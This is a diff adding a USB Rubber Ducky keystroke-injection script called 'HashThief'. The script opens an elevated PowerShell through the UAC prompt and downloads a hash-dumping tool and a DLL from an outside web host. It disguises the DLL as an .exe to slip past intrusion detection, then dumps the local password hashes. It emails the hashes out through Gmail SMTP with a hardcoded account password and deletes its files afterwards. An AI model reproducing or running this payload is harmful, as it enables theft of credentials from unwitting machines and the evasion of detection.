@@ -1,0 +1,90 @@
+REM Title: Bens HashThief
+REM Note: Adjust delays to match host DL & CPU speed
+
+REM UAC PowerShell Bypass
+DELAY 2000
+CONTROL ESCAPE
+DELAY 200
+STRING powers
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 500
+
+REM Hide payload in temp directory
+STRING cd $Env:tmp
+DELAY 200
+ENTER
+DELAY 200
+STRING Import-Module BitsTransfer
+DELAY 200
+ENTER
+DELAY 200
+REM Download payloads
+STRING Start-BitsTransfer -source "http://www.benleonardlagarde.com/usbduck/sam.exe"
+DELAY 200
+ENTER
+DELAY 2000
+REM Download as exe format instead of .dll to fool not-so-smart IDS
+STRING Start-BitsTransfer -source "http://www.benleonardlagarde.com/usbduck/libeay32.exe"
+DELAY 200
+ENTER
+DELAY 4000
+REM Rename .exe to .dll now the file is past the IDS
+STRING ren .\libeay32.exe libeay32.dll
+DELAY 200
+ENTER
+DELAY 200
+
+REM Retrieve hashes and save as variable in memory so they never touch the HDD
+STRING $Body = .\sam.exe -l
+DELAY 200
+ENTER
+DELAY 200
+REM Now to exfil the hashes via the SMTP funtion in powershell 
+REM Set email subject line to 'Username@Domain' for easy reference
+STRING $Subject = $Env:USERPROFILE + "@" + $Env:USERDOMAIN
+DELAY 200
+ENTER
+DELAY 200
+STRING $EmailFrom = 'usbduckhax@gmail.com'
+DELAY 200
+ENTER
+DELAY 200
+STRING $EmailTo = 'leonardlagardeb@gmail.com'
+DELAY 200
+ENTER
+DELAY 200
+STRING $SMTPServer = 'smtp.gmail.com'
+DELAY 200
+ENTER
+DELAY 200
+STRING $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+DELAY 200
+ENTER
+DELAY 200
+STRING $SMTPClient.EnableSsl = $true
+DELAY 200
+ENTER
+DELAY 200
+STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential('usbduckhax@gmail.com', 'USBduck1872');
+DELAY 200
+ENTER
+DELAY 200
+STRING $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+DELAY 200
+ENTER
+
+REM GTFO time - Delete all traces of payloads
+DELAY 200
+STRING rm .\libeay32.dll
+DELAY 200
+ENTER
+DELAY 200
+STRING rm .\sam.exe
+DELAY 200
+ENTER
+DELAY 200
+STRING exit
+DELAY 200
+ENTER
